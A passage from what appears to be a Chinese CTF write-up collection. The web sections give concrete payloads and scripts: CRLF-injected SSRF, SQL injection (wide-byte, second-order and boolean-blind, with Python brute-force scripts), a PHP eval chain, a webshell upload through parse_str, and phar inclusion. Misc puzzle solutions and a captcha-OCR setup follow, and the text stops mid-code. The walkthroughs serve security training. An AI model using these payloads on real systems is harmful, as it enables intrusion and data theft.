稍微搜一下能发现代码是 Golang 的， 首先可以看出 flag 是放在*http.Request 的 Header 中的， 结合 9527 端口 的回显是“Hello No.9527!” ， 可以得出 name 参数的值即为输出的值， 当请求的 Header 中含有“Logic” 头时， name 的值即为“Logic” 头的值， 但是 SSRF 在一般情况下是无法控制服务器发出请求中的 Header 的， 此时就要考虑如何 控制 SSRF 中的 Header， 即 CRLF 注入， 这里实际用的是 CVE-2019-9741。 构造 Payload： “http://127.0.0.1:9527/? HTTP/1.1\\r\\nLogic: abc” 5） 在 Go 的模板中， 要插入一个对象的值， 则使用{{.对象名}}， 回忆之前的源码泄露， flag 是放在http.Request 中的， 在结构体中可以看到http.Request 的名为 MyRequest， 所以模板注入的 Payload 为{{.MyRequest}}， 完整的 Payload： “http://127.0.0.1:9527/? HTTP/1.1\\r\\nLogic: {{.MyRequest}}” superwaf 原理知识 1） XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 解题过程 打开浏览器，访问目标主机，可以看到界面如下图1所示： 图1 web界面 每次提交payload需要提交MD5校验码，编写脚本爆破，脚本如下图2所示： 图2 爆破脚本 绕过waf的思路是bypass xss/csp \\ 图3 生成payload 最后在vps上获取到admin的cookie，也就是flag，如下图4所示，或者也可以使用xss平台。 图4 获取admin cookie Twice_Insert 原理知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。 2） SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。 解题过程 1）打开浏览器，访问目标主机，打开页面发现是sqli-labs-24关，原题是利用二次注入修改admin密码，这题修改admin密码却没有flag，要想拿到flag可能需要爆库。 2）根据题意，尝试布尔盲注 发现or被过滤 先注册一个用户，比如scl 1 然后注册 scl’and 1# 1 修改为0， 需要将scl的密码重置为1 然后注册 scl’and 0# 1 登录修改密码 提示 说明更新失败，可以布尔盲注 写个脚本 # coding = utf - 8 import requests url = \"http://127.0.0.1/sqli/Less-24/login_create.php\" url1 = \"http://127.0.0.1/sqli/Less-24/login.php\" url2 = \"http://127.0.0.1/sqli/Less-24/pass_change.php\" # 将密码改回1 def change21(): user = \"scl\" s = requests.session() data = { \"login_user\": user, \"login_password\": '0', \"mysubmit\": \"Login\" } r = s.post(url1, data) data = { \"current_password\": '0', \"password\": '1', \"re_password\": '1', \"submit\": 'Reset' } r = s.post(url2, data) def second(): flag = \"\" tmp = 1 for i in range(1, 50): if tmp == 0: break tmp = 0 for j in range(32, 127): s = requests.session() user = \"scl'and ascii(substr((select database()),\" + str(i) + \",1))=\" + str(j) + \"#\" print user # 注册用户名 data = { \"username\": user, \"password\": '1', \"re_password\": '1', \"submit\": \"Register\" } r = s.post(url, data) # 登录用户 data = { \"login_user\": user, \"login_password\": '1', \"mysubmit\": \"Login\" } r = s.post(url1, data) # print r.content.decode() if \"YOU ARE LOGGED IN AS\" in r.content.decode(): print \"login ok\" # 更改密码 data = { \"current_password\": '1', \"password\": '0', \"re_password\": '0', \"submit\": 'Reset' } r = s.post(url2, data) if \"successfully updated\" in r.content.decode(): flag += chr(j) tmp = 1 print \"change ok\" change21() break print flag second() WEB1 原理知识 1） 网站编写过程中一般都会留下一个备份文件，该文件就是网站的源码 2） Get在url中传递参数，而post需要利用插件或工具传递参数 解题过程 访问www.zip，自动下载了一个压缩包， 发现是备份文件，打开获得源码 2） 发现有两个flag，一个flag_ahead,一个flag_behind，代码审计 3)根据要求get和post传参：GET：un=0 and 1 POST：ctf[]=99999999999 4)提交flag WEB2 原理知识 文件包含漏洞 解题过程 上传一个1.jpg，内容如下 2） 得到了如下反馈： 知道了文件路径为uploads，因为是文件包含漏洞，尝试访问flag.php，如下图： 4）使用hackbar访问1.jpg 返回了GIF98，说明文件成功被包含,然后get传参，?a=ls，如下 访问uunnccttff，得到： 得到了flag的目录，查看： 得到了flag 阿风日记 原理知识 1） 利用burp intruder组件可以很方便的使用字典进行爆破 解题过程 步骤： 打开靶机，出现这样一个页面 可以根据日记大概猜测出博主喜欢设置弱密码 发现有个秘密文章需要密码访问 抓包之后,导入intruder 4.清除变量,设置pass为唯一变量, 5.粘贴弱密码 6.爆破,查看长度,得到flag 光坂镇的小诗1 原理知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。 2） SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。 3） 如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。 解题过程 步骤： 打开靶机，是这样一个诗句。 再四处查看信息过后,可以发现每一个链接都是一个get的请求,只是数字不同而已 此外还有一个输入的内容提示, 尝试sql注入报错,输入’字符,发现输入提示变为了如下 可以发现被转化了,本题考点是宽字节注入,考虑新生水平,所以将输入转化的内容直接提示出来了,这样很方便构造,所以我们可以按照输入构造sql语句,payload如下 先看本数据库的表有那些,( -1%df%27union%20select%20(select group_concat(table_name) from information_schema.tables where table_schema=database()),2%20%23) 可以看到有个flag,和img表,接下来直接读取flag的内容,payload如下,( -1%df%27union%20select%20(select%20*%20from%20flag%20limit%200,1),2%20%23) Flag出来了 光坂镇的小诗2 原理知识 1） 由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。 2） SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。 解题过程 步骤： 打开靶机， 留着一些诗 可以看到每一个链接都是发送了一个get请求, 可以大体判断出是get id然后,数据库返回id的图片的地址 但是题目信息只提示了他再数据库中,如果get id的数字超过了6就没有提示了,于是尝试sql注入,再地址栏提交1’网页没有提示,但是提交1’%23则有提示了,所以判断出了是考察的布尔盲注,并且没有过滤. 编写python脚本,在exp中 ?id=1' and length(database())='{}' %23 判断数据库长度 ?id=1' and substr(database(),{0},1)='{1}' %23爆破数据库名 id=1' and (substr((select group_concat(table_name) from information_schema.tables where table_schema='ctf'),{0},1))='{1}' %23爆破表 最后再flag表中flag字段得到了flag 拿到flag 加密的备忘录 原理知识 1) GraphQL可以使用不同的查询，返回不同的结果集合 base64编码把8字节字符分割为6字节字符，然后去查表，构造出 2) base64字符串。这里提供了加密后的密文，只要控制加密前的6位，就可以获取 到base64编码表。 解题过程 打开首页，只有一个简单界面,如图1: 图1 默认主页面 没有发现有用的地方，查看源码，从注释中发现与GraphQL相关，访问GraphQL默认页面，返回错误消息，如图2： 图2 访问graphql查询地址返回结果 可以看到没有提供GraphQL的图形化查询界面,使用浏览器插件Altair GraphQL Client即可以进行图形化的查询，如图3: 图3 Altair图形化的GraphQL查询界面 使用图形化界面的优点是方便查看schema(即接口文档，这个GraphQL服务提供了什么样的接口)。 2.2 寻找漏洞点 测试GraphQL的所有功能，发现memos有一个private字段，并提供了修改功能可以修改这个字段值，构造修改查询，可以看到mid等于2可以修改成 功，如图4: 图4 修改private属性为false 再查询memos，能看到多了1条记录，但是还是看不到留言内容。通过使用allUsers查询可以获得详细的memo信息，结果如图5: 图5 使用allUsers查询获取留言的详细信息可以看到有 password和content字段，但两个字段的内容看上去都不对。 3.2.3 base64解密 根据主页中的注释，提示有base，并且长度为64个字符，猜测为base64加密，如图6: 图6 主页源码中的注释 GraphQL中有checkPass这个查询可以使用，提供一个memo的id和密码返回检测结果,随便猜测一个密码，结果如图7: 图7 checkPass查询结果 错误消息中提示了输入的密码加密后的结果。根据base64原理，可以获取到base64的转换表，具体代码如下： #!/usr/bin/env python #coding = UTF - 8 import base64 import json import requests# 代理设置 proxy = 'http://127.0.0.1:8080' use_proxy = False MY_PROXY = None if use_proxy: MY_PROXY = { 'http': proxy, 'https': proxy, } headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\", 'Upgrade-Insecure-Requests': '1', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en,ja;q=0.9,zh-HK;q=0.8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', } my_cookie = {} def http_req(url, data = None, method = 'GET', params = None, json = False, cookies = None, proxies = MY_PROXY): if json: method = 'POST' json = data data = None if method == 'GET': params = data data = None r = requests.request(method, url, headers = headers, verify = False, json = json, params = params, data = data, cookies = cookies, proxies = MY_PROXY) return r def graph_req(url, body): body = { 'query': body } r = http_req(url, data = body, json = True) return r.json() url = \"http://localhost:8800/graphql\" def base64_decode(base_table): ''' base64的6位索引转换为字符串 ''' bases = ''.join(base_table) bytes_len = int(len(bases) / 8) byte_table = [bases[i * 8: (i + 1) * 8] for i in range(bytes_len) ] # bases2 = ''.join(byte_table) # if bases != bases2: #print('error...') char_table = [int(b, 2) for b in byte_table] return char_table def decode_one(tbl, idx): tbl = ['{0:06b}'.format(i) for i in tbl] rtbl = base64_decode(tbl) s = ''.join([chr(i) for i in rtbl]) r = graph_req(url, ''' query { checkPass(memoId: 2, password: \"%s\") } ''' % s) message = r['errors'][0]['message'] print(idx, message) valid_code = message.split(\"'\")[1][3] return valid_code# 获取base64编码表 base_tbl = [] for c in range(64): tbl = [0 b111111, 0 b111111, 0 b011011, c] valid_code = decode_one(tbl, c) base_tbl.append(valid_code) # padding字符 valid_code = decode_one([0 b111111, 0 b111111, 0 b011011], -1) base_tbl.append(valid_code) base_tbl = ''.join(base_tbl) std_b64_table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' def decode(s): table = str.maketrans(base_tbl, std_b64_table) new_s = s.translate(table) new_s += \"=\" result = base64.b64decode(bytes(new_s, 'utf-8')) return str(result, 'utf-8') print('password:', decode('要有了产于了主方以定人方于有成以他的爱爱')) print('flag:', decode( '到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱')) 0 '十十地的' not valid password. 1 '十十地一' not valid password. 2 '十十地是' not valid password. 3 '十十地在' not valid password. 4 '十十地不' not valid password. 5 '十十地了' not valid password. 6 '十十地有' not valid password. 7 '十十地和' not valid password. 8 '十十地人' not valid password. 9 '十十地这' not valid password. 10 '十十地中' not valid password. 11 '十十地大' not valid password. 12 '十十地为' not valid password. 13 '十十地上' not valid password. 14 '十十地个' not valid password. 15 '十十地国' not valid password. 16 '十十地我' not valid password. 17 '十十地以' not valid password. 18 '十十地要' not valid password. 19 '十十地他' not valid password. 20 '十十地时' not valid password. 21 '十十地来' not valid password. 22 '十十地用' not valid password. 23 '十十地们' not valid password. 24 '十十地生' not valid password. 25 '十十地到' not valid password. 26 '十十地作' not valid password. 27 '十十地地' not valid password. 28 '十十地于' not valid password. 29 '十十地出' not valid password. 30 '十十地就' not valid password. 31 '十十地分' not valid password. 32 '十十地对' not valid password. 33 '十十地成' not valid password. 34 '十十地会' not valid password. 35 '十十地可' not valid password. 36 '十十地主' not valid password. 37 '十十地发' not valid password. 38 '十十地年' not valid password. 39 '十十地动' not valid password. 40 '十十地同' not valid password. 41 '十十地工' not valid password. 42 '十十地也' not valid password. 43 '十十地能' not valid password. 44 '十十地下' not valid password. 45 '十十地过' not valid password. 46 '十十地子' not valid password. 47 '十十地说' not valid password. 48 '十十地产' not valid password. 49 '十十地种' not valid password. 50 '十十地面' not valid password. 51 '十十地而' not valid password. 52 '十十地方' not valid password. 53 '十十地后' not valid password. 54 '十十地多' not valid password. 55 '十十地定' not valid password. 56 '十十地行' not valid password. 57 '十十地学' not valid password. 58 '十十地法' not valid password. 59 '十十地所' not valid password. 60 '十十地民' not valid password. 61 '十十地得' not valid password. 62 '十十地经' not valid password. 63 '十十地十' not valid password. -1 '十十生爱' not valid password. password: HappY4Gr4phQL flag: flag{a98b35476ffdc3c3f84c4f0fa648e021} 通过获取base64编码表，实现base64算法，成功解密flag。 简单的备忘录 原理知识 GraphQL可以提供不同的查询接口，返回不同的结果集合。主要是学习GraphQL查询语句的构造。 解题过程 目标发现 打开首页，有一个超链接，打开后是GraphiQL的查询界面,如图1: 图1 GraphiQL查询界面 漏洞寻找 通过GraphiQL的Documentation Explorer可以看到支持的查询，测试各种查询返回的结果。 通过如下查询，可以获取所有用户的所有memos信息： query { allUsers { edges { node { username memos { edges { node { id private content } } } } } } } username查询执行结果如图2: 图2 获取所有memos的查询结果 查看schema，还提供了一个UpdateMemoInfo的修改功能。 2.3 漏洞利用 通过UpdateMemoInfo修改memo的private属性,修改结果如图3: 图3 修改memo id为2的记录 再使用第一次的查询，获得flag,如图4: 图4 查询出flag 上传给小姐姐的照片 原理知识 1） 由于网站开发者在进行代码编写过程无意间错误关闭vim，导致index.php文件泄露 2） 未经过滤就使parse_str函数解析变量 解题过程 打开浏览器，访问index.php，发现上传点 2）通过python脚本扫描发现.index.php.swp文件，恢复 审计源码，发现上传为白名单限制，且parse_str函数会将url请求参数解析成变量 ?filename=pic&ext_arr[]=php覆盖原白名单 上传php一句话，利用蚁剑或菜刀连接，在web根目录发现flag文件，读取获得flag 审计一下世界上最好的语言吧 原理知识 出题的思路大概就是几个综合了几个 cms的漏洞： 第一个变量覆盖是灵感来自早期 dedecms 的漏洞 第二个是关于bbcode的是出自最近的一个漏洞，参考： https://www.anquanke.com/post/id/182448（中文版） https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/（这是英文版） 第三个漏洞是海洋cms早期的一个getshell，参考： https://www.freebuf.com/vuls/150042.html 解题过程 首先打开网页 发现 source code，点击下载源码，下载后解压。 翻翻源码，在 parse_template.php 中可以看到这几行： 这里执行了 $strIf，我们网上看看，可以发现 strIf 是从 $iar 获取的，$iar 又是从 $content 中匹配得来的，$content 是函数的参数，先不看具体的逻辑，我们看看哪里调用了这个函数。 Parse_again 调用了，这里的参数看起来都没有可控的。这里有个全局变量，第一个是： 是获取 html的值。 第二个： 这里的 searchword 是从另一个字符串中匹配出来的，看起来好像没有可控的地方。 我们在 index.php 最上面发现引入了三个文件 看看 common.php，common.php 中上面是两个函数，下面是注册变量的代码： 这里注册了 _GET,_POST和_COOKIE 到变量里，但是在 check_var 中判断了禁止GLOBAS，所以不能直接传递 GLOBALS，我们分析一下 check_var：传进去的数组中key值不能是_GET,_POST 和 GLOBALS 这三个值，但是这里没有过滤 _COOKIE，我们可以传递这样一个get参数：_COOKIE[GLOBALS]=1 这样当第一次循环 _GET 时，_COOKIE 会被覆盖，第三次执行 _COOKIE 时就覆盖了 $GLOBALS了。 回到 index.php ： 这里是 $GLOBALS['GLOBALS']['content']，也是我们可控的了。这个参数还经过了 parse_code，我们看看这个函数： 执行了 $tag_parse_func 数组里的函数： 就是一段 bbcode，比如将 [b]abc[/b] 替换成 abc 我们再看看 index.php 中那两个注释，不难判断出这里应该是有些漏洞，可以导致标签逃逸，类似 xss的效果。 我们可以看到整个代码都做了 htmlentities 除了，只有一处： 但是这里被引号括起来了，上面又把引号替换成空了，所以单靠这里貌似也不行。于是我们留意到最后一个函数： 这个函数就是将 [video][/video] 替换成 标签，其中判断了 host 必须是 youtube。还可以添加一些参数值。比如： 比如我们传进：[video]http://www.youtube.com?V=123[/video] 最后就会被替换成 但是我们可以发现 按顺序来的话，是先执行 video 解析，然后再 url解析。那么如果我们的 video传进的是： [video]http://www.youtube.com?v=[url]1234[/url][/video] 先解析 video，就会变成： 然后解析 url： 1234> 到这里，会发现 video 的 src 这个属性被提前闭合了，1234逃逸出来了，我们可以利用这点，把1234变成： >haha 然后解析成 haha'>1234> 看起来我们的 search 标签成功逃逸出来了。 最终我们的payload是： ?_COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]>ceshi[/url][/video] 我们可以在本地调试输出一下： 然后这个search 标签中的值会被带入进 parse_again 函数中。现在我们就可以来分析分析这里了。 首先分析分析parseIf 的函数，这大概就是在 $content 中匹配 {if:abcd}1234{end if} 这样的值，然后把 abcd的这个地方的值拿出来 eval，我们假设一下，我们可以把 template 里的值直接替换成 {if:phpinfo()}1234{end if}，这样就能执行了，再看看我们可以控制 template 里的哪里。 回到 parse_again 这个函数，GLOBALS 里的值我们是可控的，所以我们可以控制五个变量。但是这五个变量都被限制了，首先经过了 RemoveXSS，然后又截断了20位。我们先看看 RemoveXSS，在 common.php 中： 这里大概就是说如果匹配到了不允许的字符串，就在前两位加上 ，而我们最重要的 if: 也在里面。 这个分析完，再回到 parse_again 我们可以看到这里是顺序替换的，换种思路，我们是不是可以在 searchword 中带有 searchnum，比如： 模板文件中： 这是我们最先要替换的，替换成 $searchword， 我们把 $searchword 的值设为 1{haha:searchnum}，那么下次替换 $searchnum 的时候，比如我们的 searchnum 的值是 2，那么替换完就是 12，如果我们的1是 if，而他removexss 匹配得是 if: (if+冒号)，这时候就不会被检测到。 也就是说我们可以一点一点替换，最后达到：{if:phpinfo()}1234{end if} 给出我们的payload： _COOKIE[GLOBALS][GLOBALS][content]=[video]http://www.youtube.com?v=[url]>{if{haha:searchnum}}[/url][/video] _COOKIE[GLOBALS][searchnum]=:eva{haha:type} _COOKIE[GLOBALS][type]=l($_G{haha:typename} _COOKIE[GLOBALS][typename]=ET[1]) 1=phpinfo(); 首先，我们匹配到的searchword是{if{haha:searchnum}}，然后进行替换， 一开始模板中的值为 {haha:searchword}， 第一次把 searchword替换上去后，值变成了：{if{haha:searchnum}} 然后第二次会替换 searchnum，变成了：{if:eva{haha:type}} 第三次替换 type：{if:eval($_G{haha:typename}} 最后一个替换typename：{if:eval($_GET[1])} 这就完成了，然后这个值会被传到 parseIf 中，通过正则表达式匹配出来， 因为 {end if} 在模板中其他位置是有的， 所以我们不用构造。 匹配出来的值就是eval($_GET[1])，然后被带入到 eval中，执行代码： 这好像不是上传 原理知识 1） Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了 2） 利用phar包含自定义的脚本 解题过程 步骤： 打开靶机，出现这样一个页面 根据提示后,考虑到有隐藏信息,随后在源码中发现提示 可以发现一个文件包含的功能,于是查看了something.php 继续访问upload.php,得到一下内容. 尝试上传,发现又能上传txt的文件,即使上传其他文件后,文件后缀也会被改为txt文件, 在这里选手可能会想到通过index的文件包含进行攻击,但是当使用index的文件包含的时候,会出现如下提示 在这里需要选手发现upload文件里面也有注释提示,因为考虑了新生水平,这里直接给出了考点为phar,需要选手自行搜索关于phar的知识 当选手知道phar是什么之后,会想到哪里有包含,这个时候很容易想到index里面有包含,但是index源码禁止了phar协议,而且做出了足够提示有东西在upload.php里面 所以选手需要知道upload.php里面还有东西,又考虑到index.php的包含功能,可以采用php://filter协议读取任意文件,我们这个时候读取upload.php的源码(payload: php://filter/convert.base64-encode/resource=upload.php) Base64解密后,可以发现upload的所有源码,其中也有一个没有限制的文件包含 所以了解phar和webshell是什么后,我们思路就清晰了,这个时候上传我们的phar文件 利用upload的里面的file包含我们的文件(其中包含 ),即可拿到flag MISC BACON 原理知识 培根密码 解题过程 1）打开浏览器，访问目标主机下载压缩包 2）打开压缩包，可以发现有一个txt文件，打开后可以看到其中内容如下： 可以看到字符由ab构成，可以猜到是培根密码，通过解密可得密码：fox EasyBox 原理知识 1） 深度优先搜索算法（英语：Depth-First-Search，简称DFS）是一种用于遍历或搜索树或图的算法。 沿着树的深度遍历树的节点，尽可能深的搜索树的分支。当节点v的所在边都己被探寻过或者在搜寻时结点不满足条件，搜索将回溯到发现节点v的那条边的起始节点。整个进程反复进行直到所有节点都被访问为止。属于盲目搜索,最糟糕的情况算法时间复杂度为O(!n)。 2） Pwntools提供了方便的网络交互编程的接口 解题过程 1）使用nc连接到靶机开放端口。 2）返回结果如下所示，可以看出是一个数独之类的游戏，但是交互时间很短，只能通过编写脚本来完成： 利用dfs（深度优先搜索算法）来编写计算数独空缺数字脚本，根据题目提示，这个数独只需要横向和纵向的数字和为45，并且1-9只能出现一次，部分脚本如下所示： 详细脚本见exp文件夹，exp.py使用pwntools库负责接收数据和发送数据，solve.py负责将数据整理并利用 深度优先搜索算法来得出空缺的数字，最后由exp.py发送，结果如下： Happy_puzzle 原理知识 1） PNG便携式网络图形是一种无损压缩的位图片形格式，其设计目的是试图替代GIF和TIFF文件格式，同时增加一些GIF文件格式所不具备的特性。PNG使用从LZ77派生的无损数据压缩算法，一般应用于JAVA程序、网页或S60程序中，原因是它压缩比高，生成文件体积小。 解题过程 下载题目到本地，打开压缩包发现很多data文件如下图所示： 图1 data文件 由文件夹中的info.txt可知，这些data数据块是由图片格式为400 X 400的png图片拆卡得到的， 分析 *.data (10240 * N + 5214) ，推测这些data是IDAT 数据块，编写脚本将数据块组合到一起，部分脚本如下图所示： 图2 部分脚本 最后逐个数据块测试 HEADER + IHDR + IDAT1 [+IDAT2...]，详细请见exp文件夹中的exp.py，一个一个测试可以看到已经拼出得图像，如下图所示，名称为yvxmeawg.data，在第一张的基础上往后去试第二张，以此类推： 图3 第一张 最后复原完成的效果如下图所示： 图4 最终版 Think 原理知识 1） Python的lambda一般形式是关键字lambda后面跟一个或多个参数，紧跟一个冒号，以后是一个表达式。lambda是一个表达式而不是一个语句。它能够出现在Python语法不允许def出现的地方。作为表达式，lambda返回一个值（即一个新的函数）。lambda用来编写简单的函数，而def用来处理更强大的任务。 解题过程 下载题目，打开是一个python脚本，如下图1所示： 虽然代码很长，但是可以一点点分解开分析，如图所示： 根据分解的代码内容可以推测出本题使用了异或加密，并且key为unctf，而密文就是那一长的字符串列表，可以推测下是密文解base64后，再hex转为字符串再和key按位异或得到flag，详细见exp脚本： 本题的快捷解法是直接修改checknum为1，这样通过判断就可以直接得到flag，位置如下图所示： 最终结果为： 安妮 起源 原理知识 1） 猪圈密码，银河语言，摩斯电码 解题过程 1）打开浏览器，访问目标主机下载压缩包 2）打开程序，运行到最后一步，可以看到是猪圈密码，解码后进入下一步 3）打开下一个程序，运行到最后一步，可以看到是摩斯电码，解码后进入下一步 4）打开下一个程序，运行到最后一步，可以看到是银河语言，解码后进入下一步 5）打开程序后，运行到最后一步得到flag 贝斯的图 原理知识 1） 将图片转换为Base64编码，可以让很方便地在没有上传文件的条件下将图片插入其它的网页、编辑器中。 这对于一些小的图片是极为方便的，因为不需要再去寻找一个保存图片的地方。 2） 在HTML中插入图片的时候，只需要填写代码为 解题过程 使用file命令分析文件，发现是txt 修改后缀直接查看 标准的base64编码，搜索在线解密或者直接写一个html文档转换得到图片 扫码得到base64 解码得到flag unctf{base64&image} 超速计算器 原理知识 1） 使用深度学习训练验证码识别模型很方便，速度也很快。 2） 数据集的生成或标注方法 3） python进行http请求处理的方法 解题过程 1）问题分析 打开首页，是一道计算器的题目，需要计算表达式，并提交结果，如图1。 因为表达式是图片，需要先识别图片，再执行表达式计算结果。如果要训练模型需要大量的标注数据，看看能不能 自己生成验证码数据进行训练，会方便很多。 访问/robots.txt,看到有一个code.py文件禁止爬虫访问，访问code.py，是生成验证码的代码。在代码中有用到Chopsic.ttf,访问/Chopsic.ttf获取到字体文件。然后使用code.py就可以本地生成验证码。 2）验证码识别 使用现成的captcha项目生成模型，这里使用captcha_trainer进行识别,支持不定长字符的识别。 按照说明下载代码，安装依赖。 1.数据集的准备 使用python脚本生成图片文件，文件名为验证码图片的文字： import os from code import gen_exp_pic def make_dataset(pic_path, count=10000): os.makedirs(pic_path, exist_ok=True) for i in range(count): r = gen_exp_pic() target_file = os.path.join(pic_path, r[1]+\"_.jpg\") r[0].save(target_file) datasets_dir = \"datasets/\" make_dataset(datasets_dir, count=5000) 生成dataset图片之后，再使用python make_dataset.py生成测试和训练数据集。在生成数据集之前要先配置模型信息: # - requirement.txt - GPU: tensorflow-gpu, CPU: tensorflow # - If you use the GPU version, you need to install some additional applications. System: DeviceUsage: 0.9 # ModelName: Corresponding to the model file in the model directory, # - such as YourModelName.pb, fill in YourModelName here. # CharSet: Provides a default optional built-in solution: # - [ALPHANUMERIC, ALPHANUMERIC_LOWER, ALPHANUMERIC_UPPER, # -- NUMERIC, ALPHABET_LOWER, ALPHABET_UPPER, ALPHABET, ALPHANUMERIC_LOWER_MIX_CHINESE_3500] # - Or you can use your own customized character set like: ['a', '1', '2']. # CharMaxLength: Maximum length of characters， used for label padding. # CharExclude: CharExclude should be a list, like: ['a', '1', '2'] # - which is convenient for users to freely combine character sets. # - If you don't want to manually define the character set manually, # - you can choose a built-in character set # - and set the characters to be excluded by CharExclude parameter. Model: Sites: [ 'ocr3step' ] ModelName: ocr3step ModelType: 400x32 # 支持的字符集，这里要识别的运算符号只有+*- CharSet: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '*', '-'] # 识别的最长字符数 CharMaxLength: 11 CharExclude: [] CharReplace: {} ImageWidth: 400 ImageHeight: 32 # Binaryzation: [-1: Off, >0 and 0: On]. # Blur: [-1: Off, >0: On]. # Resize: [WIDTH, HEIGHT] # - If the image size is too small, the training effect will be poor and you need to zoom in. # ReplaceTransparent: [True, False] # - True: Convert transparent images in RGBA format to opaque RGB format, # - False: Keep the original image Pretreatment: Binaryzation: -1 Smoothing: -1 Blur: -1 Resize: [400, 32] ReplaceTransparent: True # CNNNetwork: [CNN5, ResNet, DenseNet] # RecurrentNetwork: [BLSTM, LSTM, SRU, BSRU, GRU] # - The recommended configuration is CNN5+BLSTM / ResNet+BLSTM # HiddenNum: [64, 128, 256] # - This parameter indicates the number of nodes used to remember and store past states. # Optimizer: Loss function algorithm for calculating gradient. # - [AdaBound, Adam, Momentum] NeuralNet: CNNNetwork: CNN5 RecurrentNetwork: BLSTM HiddenNum: 64 KeepProb: 0.98 Optimizer: AdaBound PreprocessCollapseRepeated: False CTCMergeRepeated: True CTCBeamWidth: 1 CTCTopPaths: 1 WarpCTC: False # TrainsPath and TestPath: The local absolute path of your training and testing set. # DatasetPath: Package a sample of the TFRecords format from this path. # TrainRegex and TestRegex: Default matching apple_20181010121212.jpg file. # - The Default is .*?(?=_.*.) # TestSetNum: This is an optional parameter that is used when you want to extract some of the test set # - from the training set when you are not preparing the test set separately. # SavedSteps: A Session.run() execution is called a Step, # - Used to save training progress, Default value is 100. # ValidationSteps: Used to calculate accuracy, Default value is 500. # TestSetNum: The number of test sets, if an automatic allocation strategy is used (TestPath not set). # EndAcc: Finish the training when the accuracy reaches [EndAcc*100]% and other conditions. # EndCost: Finish the training when the cost reaches EndCost and other conditions. # EndEpochs: Finish the training when the epoch is greater than the defined epoch and other conditions. # BatchSize: Number of samples selected for one training step. # TestBatchSize: Number of samples selected for one validation step. # LearningRate: Recommended value[0.01: MomentumOptimizer/AdamOptimizer, 0.001: AdaBoundOptimizer] Trains: # 训练数据集的路径 TrainsPath: './dataset/ocr3step_trains.tfrecords' # 测试数据集的路径 TestPath: './dataset/ocr3step_test.tfrecords' # 生成的图片文件的路径 DatasetPath: [ \"./datasets/\" ] TrainRegex: '.*?(?=_)' # 提取图片label的正则表达式 TestSetNum: 200 SavedSteps: 100 ValidationSteps: 500 EndAcc: 0.95 EndCost: 0.1 EndEpochs: 2 BatchSize: 30 # 根据本机性能调整 TestBatchSize: 15 # 根据本机性能调整 LearningRate: 0.001 DecayRate: 0.98 DecaySteps: 10000 2.训练模型 生成数据集之后就是训练了，使用上面的模型配置，运行python train.py直接训练。使用GeForce GTX 1050 Ti跑了3分钟，完成训练。 3.使用模型预测 修改predict_testing.py,添加一次预测一张图片的函数，保存为predict.py，代码如下: #!/usr/bin/env python3 # -*- coding:utf-8 -*- # Author: kerlomz import io import cv2 import numpy as np import PIL.Image as PIL_Image import tensorflow as tf from importlib import import_module from config import * from constants import RunMode from pretreatment import preprocessing from framework import GraphOCR def get_image_batch(img_bytes): def load_image(image_bytes): data_stream = io.BytesIO(image_bytes) pil_image = PIL_Image.open(data_stream) rgb = pil_image.split() size = pil_image.size if len(rgb) > 3 and REPLACE_TRANSPARENT: background = PIL_Image.new('RGB', pil_image.size, (255, 255, 255)) background.paste(pil_image, (0, 0, size[0], size[1]), pil_image) pil_image = background if IMAGE_CHANNEL == 1: pil_image = pil_image.convert('L') im = np.array(pil_image) im = preprocessing(im, BINARYZATION, SMOOTH, BLUR).astype(np.float32) if RESIZE[0] == -1: ratio = RESIZE[1] / size[1] resize_width = int(ratio * size[0]) im = cv2.resize(im, (resize_width, RESIZE[1])) else: im = cv2.resize(im, (RESIZE[0], RESIZE[1])) im = im.swapaxes(0, 1) return (im[:, :, np.newaxis] if IMAGE_CHANNEL == 1 else im[:, :]) / 255. return [load_image(index) for index in [img_bytes]] def decode_maps(charset): return {index: char for index, char in enumerate(charset, 0)} def predict_func(image_batch, _sess, dense_decoded, op_input): dense_decoded_code = _sess.run(dense_decoded, feed_dict={ op_input: image_batch, }) decoded_expression = [] for item in dense_decoded_code: expression = '' for char_index in item: if char_index == -1: expression += '' else: expression += decode_maps(GEN_CHAR_SET)[char_index] decoded_expression.append(expression) return ''.join(decoded_expression) if len(decoded_expression) 